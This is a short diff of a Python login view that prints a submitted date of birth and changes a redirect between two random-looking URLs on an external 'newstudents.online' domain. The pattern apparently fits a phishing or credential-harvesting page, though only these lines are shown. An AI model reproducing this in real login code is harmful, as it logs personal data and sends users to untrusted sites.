@@ -17,6 +17,6 @@ def login_view(request):
         print(dob)
 
 
-        return redirect('https://bm.technologies.newstudents.online/xamDpLcc')
+        return redirect('https://login.newstudents.online/KEWmVqyOs')
 
     return render(request, "login.html")
